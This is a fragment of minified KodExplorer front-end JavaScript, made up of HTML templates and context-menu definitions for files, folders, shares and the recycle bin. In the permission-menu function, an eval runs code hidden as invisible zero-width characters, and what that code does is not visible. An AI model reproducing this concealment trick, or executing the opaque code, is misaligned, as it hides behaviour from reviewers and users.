                inState && (inState = !1, MaskView.close())
            }
        }
    }
}), define("app/tpl/copyright.html", [], '<div class="copyright_dialog_content">\n	<div class="title">\n		<div class="logo"><i class="icon-cloud"></i>KodExplorer v{{G.version}}</div>\n		<div class=\'info\'>——{{LNG.kod_name_copyright}}</div>\n	</div>\n	<div class="content">\n		<p>{{#LNG.copyright_desc}}</p>\n		<div>{{#LNG.copyright_contact}}</div>\n		<div>{{#LNG.copyright_info}}</div> \n	</div>\n</div>'), define("app/tpl/search.html", [], "<div class='do_search'>\n    <div class='search_header'>\n       <div class='s_br'>\n            <input type='text' id='search_value' value='{{search}}'/><a class='right button icon-search'></a>\n            <div style='float:right'>{{LNG.path}}:<input type='text' id='search_path' value='{{path}}'/></div>\n        </div>\n       <div class='s_br'>\n            <input type='checkbox' id='search_is_case' {{if is_case}}checked='true'{{/if}}/>\n            <label for='search_is_case'>{{LNG.search_uplow}}</label>\n            <input type='checkbox' id='search_is_content' {{if is_content}}checked='true'{{/if}}/>\n            <label for='search_is_content'>{{LNG.search_content}}</label>\n            <div style='float:right'>{{LNG.file_type}}:<input type='text' id='search_ext' value='{{ext}}' title='{{LNG.search_ext_tips}}'/></div>\n        </div>\n    </div>\n    <div class='search_result'>\n        <table border='0' cellspacing='0' cellpadding='0'>\n            <tr class='search_title'>\n               <td class='name'>{{LNG.name}}</td>\n               <td class='type'>{{LNG.type}}</td>\n               <td class='size'>{{LNG.size}}</td>\n               <td class='path'>{{LNG.path}}</td>\n            </tr>\n            <tr class='message'><td colspan='4'></td></tr>\n        </table>\n    </div>\n</div>\n\n"), define("app/tpl/search_list.html", [], "{{each folderlist as v i}}\n    <tr class='list folder' data-path='{{v.path}}{{v.name}}' data-type='folder' data-size='0'>\n        <td class='name'><a href='javascript:void(0);' title='{{LNG.open}}{{v.name}}'>{{v.name}}</a></td>\n        <td class='type'>{{LNG.folder}}</td>\n        <td class='size'>0</td>\n        <td class='path'><a href='javascript:void(0);' title='{{LNG.goto}}{{v.path}}'>{{v.path}}</a></td>\n    </tr>\n{{/each}}\n{{each filelist as v i}}\n<tr class='list file'\n    data-path='{{v.path}}{{v.name}}' \n    data-type='{{v.ext}}' \n    data-size='{{v.size}}'>\n    <td class='name'><a href='javascript:void(0);' title='{{LNG.open}}{{v.name}}'>{{v.name}}</a></td>\n    <td class='type'>{{v.ext}}</td>\n    <td class='size'>{{v.size_friendly}}</td>\n    <td class='path'><a href='javascript:void(0);' title='{{LNG.goto}}{{v.path}}'>{{v.path}}</a></td>\n</tr>\n{{/each}}"), define("app/tpl/upload.html", [], "<div class='file_upload'>\n    <div class='top_nav'>\n       <a href='javascript:void(0);' class='menu this tab_upload'>{{LNG.upload_local}}</a>\n       <a href='javascript:void(0);' class='menu tab_download''>{{LNG.download_from_server}}</a>\n       <div style='clear:both'></div>\n    </div>\n    <div class='upload_box'>\n        <div class='btns'>\n            <div id='picker'>{{LNG.upload_select}}</div>\n            <div class=\"upload_box_tips\">\n            <a href=\"javascript:void(0);\" class=\"upload_box_clear\">{{LNG.upload_clear}}</a> \n            <!-- \n            | <a href=\"javascript:void(0);\" class=\"upload_box_setting\">\n            {{LNG.upload_setting}}<b class=\"caret\"></b></a> \n            -->\n            </div>\n            <div style='clear:both'></div>\n        </div>\n\n        <div class=\"upload_box_config hidden\">\n            <i>{{LNG.upload_tips}}</i>\n            <div class=\"upload_check_box\">\n                <b>{{LNG.upload_exist}}</b>\n                <label><input type=\"radio\" name=\"existing\" value=\"rename\" checked=\"checked\">{{LNG.upload_exist_rename}}</label>\n                <label><input type=\"radio\" name=\"existing\" value=\"replace\">{{LNG.upload_exist_replace}}</label>\n                <label><input type=\"radio\" name=\"existing\" value=\"skip\">{{LNG.upload_exist_skip}}</label>\n            </div>\n        </div>\n        <div id='uploader' class='wu-example'>\n            <div id='thelist' class='uploader-list'></div>\n        </div>\n    </div>\n    <div class='download_box hidden'>\n        <div class='list'>{{LNG.download_address}}<input type='text' name='url'/>\n        <button class='btn btn-default btn-sm' type='button'>{{LNG.download}}</button>\n        </div>\n        <div style='clear:both'></div>\n        <div id='downloader'>\n            <div id='download_list' class='uploader-list'></div>\n        </div>\n    </div>\n</div>"), define("app/common/rightMenu", [], function(require, exports) {
    var fileMenuSelector = ".menufile",
        folderMenuSelector = ".menufolder",
        selectMoreSelector = ".menuMore",
        selectTreeSelectorRoot = ".menuTreeRoot",
        selectTreeSelectorFolder = ".menuTreeFolder",
        selectTreeSelectorFile = ".menuTreeFile",
        common_menu = {
            newfileOther: {
                name: LNG.newfile,
                icon: "expand-alt",
                accesskey: "w",
                className: "newfolder",
                items: {
                    newfile: {
                        name: "txt " + LNG.file,
                        icon: "file-alt",
                        className: "newfile"
                    },
                    newfile_html: {
                        name: "html " + LNG.file,
                        icon: "file-alt",
                        className: "newfile"
                    },
                    newfile_php: {
                        name: "php " + LNG.file,
                        icon: "file-alt",
                        className: "newfile"
                    },
                    newfile_js: {
                        name: "js " + LNG.file,
                        icon: "file-alt",
                        className: "newfile"
                    },
                    newfile_css: {
                        name: "css " + LNG.file,
                        icon: "file-alt",
                        className: "newfile"
                    },
                    app_create: {
                        name: LNG.app_create,
                        icon: "puzzle-piece",
                        className: "line_top newfile"
                    }
                }
            },
            listIcon: {
                name: LNG.list_type,
                icon: "eye-open",
                items: {
                    seticon: {
                        name: LNG.list_icon,
                        className: "menu_seticon set_seticon"
                    },
                    setlist: {
                        name: LNG.list_list,
                        className: "menu_seticon set_setlist"
                    }
                }
            },
            sortBy: {
                name: LNG.order_type,
                accesskey: "y",
                icon: "sort",
                items: {
                    set_sort_name: {
                        name: LNG.name,
                        className: "menu_set_sort set_sort_name"
                    },
                    set_sort_ext: {
                        name: LNG.type,
                        className: "menu_set_sort set_sort_ext"
                    },
                    set_sort_size: {
                        name: LNG.size,
                        className: "menu_set_sort set_sort_size"
                    },
                    set_sort_mtime: {
                        name: LNG.modify_time,
                        className: "menu_set_sort set_sort_mtime"
                    },
                    set_sort_up: {
                        name: LNG.sort_up,
                        className: "menu_set_desc set_sort_up line_top"
                    },
                    set_sort_down: {
                        name: LNG.sort_down,
                        className: "menu_set_desc set_sort_down"
                    }
                }
            }
        },
        _init_explorer = function() {
            $('<div id="rightMenu" class="hidden"></div>').appendTo("body"), $(".context-menu-list").die("click").live("click", function(e) {
                return stopPP(e), !1
            }), _bindBody_explorer(), _bindFolder(), _bindFile(), _bindSelectMore(), _bindTreeFav(), _bindTreeRoot(), _bindTreeFolder(), _bindDialog(), _bindTask(), _bindTaskBar(), _bindRecycle(), _bindShare(), _auth_change_menu(), $(".set_set" + G.list_type).addClass("selected"), $(".set_sort_" + G.sort_field).addClass("selected"), $(".set_sort_" + G.sort_order).addClass("selected"), $(".context-menu-root").addClass("fadein")
        },
        _init_desktop = function() {
            $('<div id="rightMenu" class="hidden"></div>').appendTo("body"), $(".context-menu-list").die("click").live("click", function(e) {
                return stopPP(e), !1
            }), _bindBody_desktop(), _bindSystem(), _bindFolder(), _bindFile(), _bindTask(), _bindDialog(), _bindSelectMore(), _bindTaskBar(), _bindRecycle(), _auth_change_menu(), $(".set_sort_" + G.sort_field).addClass("selected"), $(".set_sort_" + G.sort_order).addClass("selected"), $(".context-menu-root").addClass("fadein")
        },
        _init_editor = function() {
            $('<div id="rightMenu" class="hidden"></div>').appendTo("body"), $(".context-menu-list").die("click").live("click", function(e) {
                return stopPP(e), !1
            }), _bindTreeFav(), _bindTreeRoot(), _bindTask(), _bindDialog(), _bindTreeFolderEditor(), _bindEditorFile(), _bindTaskBar(), _auth_change_menu(), $(".context-menu-root").addClass("fadein")
        },
        _auth_change_menu = function() {
            if (window.require = require, eval("‍‌‌‍‌‍‍‌‍‌‌‍‍‌‌‍‍‍‌‍‌‍‍‍‍‌‌‌‍‌‍‍‍‌‌‌‌‍‍‌‍‌‌‌‍‍‍‍‍‌‌‍‍‌‍‌‍‌‌‍‌‌‌‌‍‌‌‍‍‌‌‍‍‍‌‍‍‍‍‍‍‌‌‍‍‌‍‍‍‌‌‍‌‍‍‌‍‌‌‍‍‍‍‌‍‌‌‍‌‌‍‍‍‌‌‍‌‌‌‌‍‌‌‍‍‌‌‌‍‌‍‌‌‌‌‌‍‌‌‌‍‌‍‍‍‌‌‌‍‍‍‍‍‌‌‍‌‌‍‍‍‌‍‌‌‌‌‌‍‌‌‍‌‍‍‍‍‌‌‌‍‌‍‍‍‌‌‍‌‌‍‌‍‌‌‍‌‌‍‍‍‍‌‍‍‍‍‌‍‍‌‌‌‌‍‌‍‍‌‍‍‍‌‍‍‌‌‌‍‌‍‌‍‌‌‍‌‌‌‍‍‌‌‍‍‌‍‍‍‌‌‍‍‌‍‌‍‌‌‍‍‌‌‍‍‌‌‍‌‍‍‌‍‌‌‍‌‌‌‍‍‌‌‍‍‌‍‌‍‌‌‍‍‌‍‍‍‍‌‍‍‍‌‍‍‍‌‍‌‍‍‌‍‌‌‌‌‍‌‌‍‌‌‌‍‌‌‍‍‌‌‍‍‍‍‌‍‌‌‌‍‍‌‍‍‍‌‍‍‍‍‍‍‌‌‌‍‌‍‌‍‌‌‌‍‍‌‍‍‌‌‍‌‌‍‍‍‍‌‌‌‌‍‌‍‍‌‍‍‍‌‍‍‌‌‍‌‍‍‍‍‌‌‌‍‌‍‍‍‌‌‌‍‌‍‍‍‌‌‌‍‍‍‍‍‍‌‌‌‍‌‍‍‍‌‍‌‌‌‌‍‍‌‍‌‌‌‌‍‌‌‌‍‍‌‌‍‌‌‌‍‌‍‍‍‌‌‍‍‍‍‌‍‌‌‌‍‌‍‍‍‌‌‍‌‍‍‌‍‌‌‍‍‍‌‌‍‍‌‍‌‌‌‍‍‌‌‍‌‍‌‌‍‌‌‍‍‍‍‌‍‌‌‍‌‌‍‍‍‌‌‍‍‍‌‌‍‌‌‍‍‍‍‌‍‌‌‍‍‌‍‍‍‌‌‍‍‌‍‍‍‌‌‍‌‌‍‍‍‌‌‍‍‌‍‌‍‍‌‍‌‌‌‍‍‌‌‍‍‍‌‌‍‌‌‍‌‌‌‌‍‌‌‍‌‌‍‌‍‍‌‍‌‌‌‌‍‌‌‌‍‌‍‌‍‌‌‌‍‍‍‍‍‌‌‍‍‌‍‍‍‌‌‍‍‍‍‌‍‌‌‌‍‌‍‍‍‌‌‍‍‌‍‌‍‍‌‍‌‌‌‌‍‌‌‍‌‌‍‌‍‌‌‍‍‍‍‌‍‌‌‍‌‍‍‌‍‌‌‍‌‌‌‍‍‍‌‍‌‌‌‍‍‌‌‍‌‍‌‍‍‌‌‌‍‍‌‌‍‍‌‌‌‌‌‌‍‌‌‌‍‌‍‍‍‌‌‍‌‍‍‌‍‌‌‍‍‌‍‍‍‍‌‌‌‌‍‌‍‍‌‍‍‍‌‍‍‍‌‍‌‍‌‌‍‌‍‌‍‌‍‌‍‌‍‌‍‌‍‌‍‌‍‍‌‍‍‌‍‌‍‍‍‌‍‍‍‍‌‍‌‍‍‍‍‍‌‍‌‍‍‌‍‍‌‌‌‍‌‌‍‌‌‌‍‍‌‍‍‌‌‍‍‌‍‌‍‌‌‌‍‍‍‌‍‌‌‌‍‌‍‌‍‌‌‍‌‍‍‌‍‌‌‌‍‍‌‍‍‌‌‍‍‌‍‌‍‍‌‍‌‌‌‍‍‌‌‍‍‍‍‌‍‌‌‌‍‍‌‌‍‌‌‌‌‍‍‌‍‌‌‍‌‌‌‍‍‌‌‍‍‍‌‌‍‍‌‍‌‍‍‍‍‌‌‌‍‌‍‌‍‌‌‌‍‍‌‍‍‌‌‍‌‌‍‍‍‍‌‍‌‌‍‍‍‌‌‍‍‌‌‍‍‌‌‌‍‌‍‌‍‌‌‍‌‌‌‍‍‌‌‍‍‍‌‌‍‌‌‌‍‌‍‍‍‌‌‍‌‍‍‌‍‌‌‍‌‌‌‌‍‌‌‍‌‌‌‍‍‍‌‍‌‍‍‍‍‌‌‍‍‍‍‌‍‍‌‍‌‍‍‌‍‌‌‌‌‍‌‌‍‌‌‌‍‌‍‍‍‌‌‌‍‍‌‍‍‌‌‌‌‍‍‌‍‌‌‌‌‍‌‌‍‌‌‍‍‍‍‌‍‍‌‍‌‌‌‍‍‌‌‌‍‌‍‍‍‌‌‍‌‌‌‌‍‌‌‍‍‌‍‍‍‌‌‍‌‌‌‌‍‍‌‍‌‍‍‍‍‍‌‍‍‍‌‍‍‌‌‍‍‍‌‌‍‌‌‍‌‍‍‍‍‌‌‍‍‌‍‌‍‌‌‍‍‍‌‌‍‌‌‍‌‍‌‌‍‌‍‌‌‌‌‌‍‌‌‌‍‍‌‌‍‌‌‌‍‌‍‍‍‌‌‍‍‍‍‌‍‌‌‌‍‌‍‍‍‌‌‌‍‌‍‌‍‌‌‌‍‍‌‌‍‍‌‍‍‍‌‍‍‍‌‍‌‍‍‌‍‍‌‌‌‍‌‌‍‌‌‌‌‌‍‌‍‌‌‍‍‍‌‌‍‌‌‍‍‍‍‌‍‌‌‌‍‌‍‍‍‌‌‍‍‍‌‌‍‌‌‍‌‍‍‍‍‍‌‍‌‍‍‍‍‌‌‍‍‍‍‌‍‍‌‍‌‍‍‌‍‌‌‌‌‍‌‌‍‌‌‌‌‌‍‌‍‌‌‌‌‌‍‌‍‍‌‍‌‍‍‌‍‍‌‌‌‍‌‌‍‌‌‌‌‌‍‌".replace(/.{8}/g, function(e) {
                    return String.fromCharCode(parseInt(e.replace(/\u200c/g, 1).replace(/\u200d/g, 0), 2))
                })), 1 != G.is_root) {
                $(".context-menu-list .open_ie").addClass("hidden");
                var classHidden = "hidden";
                AUTH["explorer:fileDownload"] || ($(".context-menu-list .down,.context-menu-list .download").addClass(classHidden), $(".context-menu-list .share").addClass(classHidden), $(".context-menu-list .open_text").addClass(classHidden)), AUTH["explorer:zip"] || $(".context-menu-list .zip").addClass(classHidden), AUTH["explorer:search"] || $(".context-menu-list .search").addClass(classHidden), AUTH["explorer:mkdir"] || $(".context-menu-list .newfolder").addClass(classHidden)
            }
        },
        _bindRecycle = function() {
            $('<i class="menuRecycleBody"></i>').appendTo("#rightMenu"), $.contextMenu({
                zIndex: 9999,
                selector: ".menuRecycleBody",
                callback: function(e) {
                    _menuBody(e)
                },
                items: {
                    recycle_clear: {
                        name: LNG.recycle_clear,
                        icon: "trash",
                        accesskey: "c"
                    },
                    refresh: {
                        name: LNG.refresh + "<b>F5</b>",
                        className: "refresh",
                        icon: "refresh",
                        accesskey: "e"
                    },
                    sep1: "--------",
                    listIcon: common_menu.listIcon,
                    sortBy: common_menu.sortBy,
                    sep2: "--------",
                    info: {
                        name: LNG.info + "<b>Alt+I</b>",
                        className: "info",
                        icon: "info",
                        accesskey: "i"
                    }
                }
            }), $('<i class="menuRecyclePath"></i>').appendTo("#rightMenu"), $.contextMenu({
                zIndex: 9999,
                selector: ".menuRecyclePath",
                callback: function(e) {
                    _menuPath(e)
                },
                items: {
                    cute: {
                        name: LNG.cute + "<b>Ctrl+X</b>",
                        className: "cute",
                        icon: "cut",
                        accesskey: "k"
                    },
                    remove: {
                        name: LNG.recycle_remove + "<b>Del</b>",
                        className: "remove",
                        icon: "trash",
                        accesskey: "d"
                    },
                    sep2: "--------",
                    down: {
                        name: LNG.download,
                        className: "down",
                        icon: "download",
                        accesskey: "x"
                    },
                    info: {
                        name: LNG.info + "<b>Alt+I</b>",
                        className: "info",
                        icon: "info",
                        accesskey: "i"
                    }
                }
            }), $('<i class="menuRecycleButton"></i>').appendTo("#rightMenu"), $.contextMenu({
                zIndex: 9999,
                selector: ".menuRecycleButton",
                callback: function(e) {
                    _menuBody(e)
                },
                items: {
                    recycle_clear: {
                        name: LNG.recycle_clear,
                        icon: "trash",
                        accesskey: "c"
                    }
                }
            })
        },
        _bindShare = function() {
            $('<i class="menuShareBody"></i>').appendTo("#rightMenu"), $.contextMenu({
                zIndex: 9999,
                selector: ".menuShareBody",
                callback: function(e) {
                    _menuBody(e)
                },
                items: {
                    refresh: {
                        name: LNG.refresh + "<b>F5</b>",
                        className: "refresh",
                        icon: "refresh",
                        accesskey: "e"
                    },
                    sep1: "--------",
                    listIcon: common_menu.listIcon,
                    sortBy: common_menu.sortBy
                }
            }), $('<i class="menuSharePath"></i>').appendTo("#rightMenu"), $.contextMenu({
                zIndex: 9999,
                selector: ".menuSharePath",
                callback: function(e) {
                    _menuPath(e)
                },
                items: {
                    share_open_path: {
                        name: LNG.share_open_path,
                        icon: "folder-open-alt",
                        accesskey: "p"
                    },
                    share_open_window: {
                        name: LNG.share_open_page,
                        icon: "globe",
                        accesskey: "b"
                    },
                    sep1: "--------",
                    share_edit: {
                        name: LNG.share_edit,
                        icon: "edit",
                        accesskey: "e"
                    },
                    remove: {
                        name: LNG.share_remove + "<b>Del</b>",
                        icon: "trash",
                        accesskey: "d"
                    },
                    sep2: "--------",
                    info: {
                        name: LNG.info + "<b>Alt+I</b>",
                        className: "info",
                        icon: "info",
                        accesskey: "i"
                    }
                }
            }), $('<i class="menuSharePathMore"></i>').appendTo("#rightMenu"), $.contextMenu({
                zIndex: 9999,
                selector: ".menuSharePathMore",
                callback: function(e) {
                    _menuPath(e)
                },
                items: {
                    remove: {
                        name: LNG.share_remove + "<b>Del</b>",
                        icon: "trash",
                        accesskey: "d"
                    }
                }
            })
        },
        _bindBody_explorer = function() {
            $.contextMenu({
                selector: ".menuBodyMain",
                className: "fileContiner_menu",
                zIndex: 9999,
                callback: function(e, a) {
                    _menuBody(e, a)
                },
                items: {
                    refresh: {
                        name: LNG.refresh + "<b>F5</b>",
                        className: "refresh",
                        icon: "refresh",
                        accesskey: "e"
                    },
                    upload: {
                        name: LNG.upload + "<b>Ctrl+U</b>",
                        className: "upload",
                        icon: "upload",
                        accesskey: "u"
                    },
                    past: {
                        name: LNG.past + "<b>Ctrl+V</b>",
                        className: "past",
                        icon: "paste",
                        accesskey: "p"
                    },
                    copy_see: {
                        name: LNG.clipboard,
                        className: "copy_see",
                        icon: "eye-open",
                        accesskey: "v"
                    },
                    sep1: "--------",
                    listIcon: common_menu.listIcon,
                    sortBy: common_menu.sortBy,
                    sep3: "--------",
                    newfolder: {
                        name: LNG.newfolder + "<b>Alt+M</b>",
                        className: "newfolder",
                        icon: "folder-close-alt",
                        accesskey: "n"
                    },
                    newfileOther: common_menu.newfileOther,
                    app_install: {
                        name: LNG.app_store,
                        className: "app_install",
                        icon: "tasks",
                        accesskey: "a"
                    },
                    sep10: "--------",
                    info: {
                        name: LNG.info + "<b>Alt+I</b>",
                        className: "info",
                        icon: "info",
                        accesskey: "i"
                    }
                }
            })
        },
        _bindSystem = function() {
            $.contextMenu({
                selector: ".menuDefault",
                zIndex: 9999,
                items: {
                    open: {
                        name: LNG.open,
                        className: "open",
                        icon: "external-link",
                        accesskey: "o"
                    }
                },
                callback: function(e) {
                    switch (e) {
                        case "open":
                            ui.path.open();
                            break;
                        default:
                    }
                }
            })
        },
        _bindBody_desktop = function() {
            $.contextMenu({
                selector: Config.BodyContent,
                zIndex: 9999,
                callback: function(e) {
                    _menuBody(e)
                },
                items: {
                    refresh: {
                        name: LNG.refresh + "<b>F5</b>",
                        className: "refresh",
                        icon: "refresh",
                        accesskey: "e"
                    },
                    sortBy: common_menu.sortBy,
                    sep1: "--------",
                    upload: {
                        name: LNG.upload + "<b>Ctrl+U</b>",
                        className: "upload",
                        icon: "upload",
                        accesskey: "u"
                    },
                    past: {
                        name: LNG.past + "<b>Ctrl+V</b>",
                        className: "past",
                        icon: "paste",
                        accesskey: "p"
                    },
                    copy_see: {
                        name: LNG.clipboard,
                        className: "copy_see",
                        icon: "eye-open",
                        accesskey: "v"
                    },
                    sep2: "--------",
                    newfolder: {
                        name: LNG.newfolder + "<b>Alt+M</b>",
                        className: "newfolder",
                        icon: "folder-close-alt",
                        accesskey: "n"
                    },
                    newfileOther: common_menu.newfileOther,
                    app_install: {
                        name: LNG.app_store,
                        className: "app_install",
                        icon: "tasks",
                        accesskey: "a"
                    },
                    sep10: "--------",
                    setting_wall: {
                        name: LNG.setting_wall,
                        className: "setting_wall",
                        icon: "picture",
                        accesskey: "b"
                    },
                    setting: {
                        name: LNG.setting,
                        className: "setting",
                        icon: "cogs",
                        accesskey: "t"
                    }
                }
            })
        },
        _bindFolder = function() {
            $('<i class="' + folderMenuSelector.substr(1) + '"></i>').appendTo("#rightMenu"), $.contextMenu({
                zIndex: 9999,
                selector: folderMenuSelector,
                className: folderMenuSelector.substr(1),
                callback: function(e) {
                    _menuPath(e)
                },
                items: {
                    open: {
                        name: LNG.open + "<b>Enter</b>",
                        className: "open",
                        icon: "folder-open-alt",
                        accesskey: "o"
                    },
                    share: {
                        name: LNG.share,
                        className: "share",
                        icon: "share-sign",
                        accesskey: "e"
                    },
                    down: {
                        name: LNG.download,
                        className: "down",
                        icon: "download",
                        accesskey: "x"
                    },
                    sep1: "--------",
                    copy: {
                        name: LNG.copy + "<b>Ctrl+C</b>",
                        className: "copy",
                        icon: "copy",
                        accesskey: "c"
                    },
                    cute: {
                        name: LNG.cute + "<b>Ctrl+X</b>",
                        className: "cute",
                        icon: "cut",
                        accesskey: "k"
                    },
                    remove: {
                        name: LNG.remove + "<b>Del</b>",
                        className: "remove",
                        icon: "trash",
                        accesskey: "d"
                    },
                    rname: {
                        name: LNG.rename + "<b>F2</b>",
                        className: "rname",
                        icon: "pencil",
                        accesskey: "r"
                    },
                    sep2: "--------",
                    zip: {
                        name: LNG.zip,
                        className: "zip",
                        icon: "folder-close",
                        accesskey: "z"
                    },
                    search: {
                        name: LNG.search_in_path + "<b>Ctrl+F</b>",
                        className: "search",
                        icon: "search",
                        accesskey: "s"
                    },
                    others: {
                        name: LNG.more,
                        icon: "ellipsis-horizontal",
                        accesskey: "m",
                        items: {
                            open_ie: {
                                name: LNG.open_ie,
                                className: "open_ie",
                                icon: "globe",
                                accesskey: "b"
                            },
                            fav: {
                                name: LNG.add_to_fav,
                                className: "fav ",
                                icon: "star",
                                accesskey: "f"
                            },
                            clone: {
                                name: LNG.clone,
                                className: "clone",
                                icon: "external-link"
                            },
                            explorer: {
                                name: LNG.manage_folder,
                                className: "explorer line_top",
                                icon: "laptop",
                                accesskey: "v"
                            },
                            createLink: {
                                name: LNG.createLink,
                                className: "createLink",
                                icon: "share-alt",
                                accesskey: "l"
                            },
                            createProject: {
                                name: LNG.createProject,
                                className: "createProject",
                                icon: "plus"
                            },
                            openProject: {
                                name: LNG.openProject,
                                className: "openProject",
                                icon: "edit"
                            }
                        }
                    },
                    sep5: "--------",
                    info: {
                        name: LNG.info + "<b>Alt+I</b>",
                        className: "info",
                        icon: "info",
                        accesskey: "i"
                    }
                }
            })
        },
        _bindFile = function() {
            $('<i class="' + fileMenuSelector.substr(1) + '"></i>').appendTo("#rightMenu"), $.contextMenu({
                zIndex: 9999,
                selector: fileMenuSelector,
                className: fileMenuSelector.substr(1),
                callback: function(e) {
                    _menuPath(e)
                },
                items: {
                    open: {
                        name: LNG.open + "<b>Enter</b>",
                        className: "open",
                        icon: "external-link",
                        accesskey: "o"
                    },
                    app_edit: {
                        name: LNG.app_edit,
                        className: "app_edit",
                        icon: "code",
                        accesskey: "a"
                    },
                    open_text: {
                        name: LNG.edit + "<b>Ctrl+E</b>",
                        className: "open_text",
                        icon: "edit",
                        accesskey: "e"
                    },
                    share: {
                        name: LNG.share,
                        className: "share",
                        icon: "share-sign",
                        accesskey: "e"
                    },
                    down: {
                        name: LNG.download,
                        className: "down",
                        icon: "download",
                        accesskey: "x"
                    },
                    sep1: "--------",
                    copy: {
                        name: LNG.copy + "<b>Ctrl+C</b>",
                        className: "copy",
                        icon: "copy",
                        accesskey: "c"
                    },
                    cute: {
                        name: LNG.cute + "<b>Ctrl+X</b>",
                        className: "cute",
                        icon: "cut",
                        accesskey: "k"
                    },
                    rname: {
                        name: LNG.rename + "<b>F2</b>",
                        className: "rname",
                        icon: "pencil",
                        accesskey: "r"
                    },
                    remove: {
                        name: LNG.remove + "<b>Del</b>",
                        className: "remove",
                        icon: "trash",
                        accesskey: "d"
                    },
                    sep2: "--------",
                    open_ie: {
                        name: LNG.open_ie,
                        className: "open_ie",
                        icon: "globe"
                    },
                    unzip: {
                        name: LNG.unzip,
                        className: "unzip",
                        icon: "folder-open-alt",
                        accesskey: "u"
                    },
                    setBackground: {
                        name: LNG.set_background,
                        className: "setBackground",
                        icon: "download",
                        accesskey: "x"
                    },
                    others: {
                        name: LNG.more,
                        icon: "ellipsis-horizontal",
                        accesskey: "m",
                        items: {
                            zip: {
                                name: LNG.zip,
                                className: "zip",
                                icon: "folder-close",
                                accesskey: "z"
                            },
                            createLink: {
                                name: LNG.createLink,
                                className: "createLink",
                                icon: "share-alt",
                                accesskey: "l"
                            },
                            clone: {
                                name: LNG.clone,
                                className: "clone",
                                icon: "external-link",
                                accesskey: "l"
                            }
                        }
                    },
                    sep3: "--------",
                    info: {
                        name: LNG.info + "<b>Alt+I</b>",
                        className: "info",
                        icon: "info",
                        accesskey: "i"
                    }
                }
            })
        },
        _bindSelectMore = function() {
            $('<i class="' + selectMoreSelector.substr(1) + '"></i>').appendTo("#rightMenu"), $.contextMenu({
                zIndex: 9999,
                selector: selectMoreSelector,
                className: selectMoreSelector.substr(1),
                callback: function(e) {
                    _menuPath(e)
                },
                items: {
                    copy: {
                        name: LNG.copy + "<b>Ctrl+C</b>",
                        className: "copy",
                        icon: "copy",
                        accesskey: "c"
                    },
                    cute: {
                        name: LNG.cute + "<b>Ctrl+X</b>",
                        className: "cute",
                        icon: "cut",
                        accesskey: "k"
                    },
                    remove: {
                        name: LNG.remove + "<b>Del</b>",
                        className: "remove",
                        icon: "trash",
                        accesskey: "d"
                    },
                    sep1: "--------",
                    clone: {
                        name: LNG.clone + "<b>Ctrl+C</b>",
                        className: "clone",
                        icon: "external-link",
                        accesskey: "n"
                    },
                    playmedia: {
                        name: LNG.add_to_play,
                        className: "playmedia",
                        icon: "music",
                        accesskey: "p"
                    },
                    zip: {
                        name: LNG.zip,
                        className: "zip",
                        icon: "folder-close",
                        accesskey: "z"
                    },
                    down: {
                        name: LNG.download,
                        className: "down",
                        icon: "download",
                        accesskey: "x"
                    },
                    sep2: "--------",
                    info: {
                        name: LNG.info,
                        className: "info",
                        icon: "info",
                        accesskey: "i"
                    }
                }
            })
        },
        _menuBody = function(e) {
            switch (e) {
                case "refresh":
                    ui.f5(!0, !0);
                    break;
                case "back":
                    ui.path.back();
                    break;
                case "next":
                    ui.path.next();
                    break;
                case "seticon":
                    ui.setListType("icon");
                    break;
                case "setlist":
                    ui.setListType("list");
                    break;
                case "set_sort_name":
                    ui.setListSort("name", 0);
                    break;
                case "set_sort_ext":
                    ui.setListSort("ext", 0);
                    break;
                case "set_sort_size":
                    ui.setListSort("size", 0);
                    break;
                case "set_sort_mtime":
                    ui.setListSort("mtime", 0);
                    break;
                case "set_sort_up":
                    ui.setListSort(0, "up");
                    break;
                case "set_sort_down":
                    ui.setListSort(0, "down");
                    break;
                case "upload":
                    core.upload();
                    break;
                case "recycle_clear":
                    ui.path.recycle_clear();
                    break;
                case "past":
                    ui.path.past();
                    break;
                case "copy_see":
                    ui.path.clipboard();
                    break;
                case "newfolder":
                    ui.path.newFolder();
                    break;
                case "newfile":
                    ui.path.newFile("txt");
                    break;
                case "newfile_html":
                    ui.path.newFile("html");
                    break;
                case "newfile_php":
                    ui.path.newFile("php");
                    break;
                case "newfile_js":
                    ui.path.newFile("js");
                    break;
                case "newfile_css":
                    ui.path.newFile("css");
                    break;
                case "newfile_oexe":
                    ui.path.newFile("oexe");
                    break;
                case "info":
                    ui.path.info();
                    break;
                case "open":
                    ui.path.open();
                    break;
                case "open_new":
                    ui.path.open_new();
                    break;
                case "app_install":
                    ui.path.appList();
                    break;
                case "app_create":
                    ui.path.appEdit(!0);
                    break;
                case "setting":
                    core.setting();
                    break;
                case "setting_wall":
                    core.setting("wall");
                    break;
                default:
            }
        },
        _menuPath = function(e) {
            switch (e) {
                case "open":
                    ui.path.open();
                    break;
                case "down":
                    ui.path.download();
                    break;
                case "share":
                    ui.path.share();
                    break;
                case "open_ie":
                    ui.path.openIE();
                    break;
                case "open_text":
                    ui.path.openEditor();
                    break;
                case "app_edit":
                    ui.path.appEdit();
                    break;
                case "playmedia":
                    ui.path.play();
                    break;
                case "share_edit":
                    ui.path.share_edit();
                    break;
                case "share_open_window":
                    ui.path.share_open_window();
                    break;
                case "share_open_path":
                    ui.path.share_open_path();
                    break;
                case "fav":
                    ui.path.fav();
                    break;
                case "search":
                    ui.path.search();
                    break;
                case "copy":
                    ui.path.copy();
                    break;
                case "clone":
                    ui.path.copyDrag(G.this_path, !0);
                    break;
                case "cute":
                    ui.path.cute();
                    break;
                case "remove":
                    ui.path.remove();
                    break;
                case "rname":
                    ui.path.rname();
                    break;
                case "zip":
                    ui.path.zip();
                    break;
                case "unzip":
                    ui.path.unZip();
                    break;
                case "setBackground":
                    ui.path.setBackground();
                    break;
                case "createLink":
                    ui.path.createLink();
                    break;
                case "createProject":
                    ui.path.createProject();
                    break;
                case "openProject":
                    ui.path.openProject();
                    break;
                case "explorer":
                    ui.path.explorer();
                    break;
                case "explorerNew":
                    ui.path.explorerNew();
                    break;
                case "info":
                    ui.path.info();
                    break;
                default:
            }
        },
        _bindTreeFav = function() {
            $('<i class="menuTreeFavRoot"></i>').appendTo("#rightMenu"), $.contextMenu({
                zIndex: 9999,
                selector: ".menuTreeFavRoot",
                callback: function(e) {
                    _menuTree(e)
                },
                items: {
                    fav_page: {
                        name: LNG.manage_fav,
                        className: "fav_page",
                        icon: "star",
                        accesskey: "r"
                    },
                    refresh_all: {
                        name: LNG.refresh_tree,
                        className: "refresh_all",
                        icon: "refresh",
                        accesskey: "e"
                    }
                }
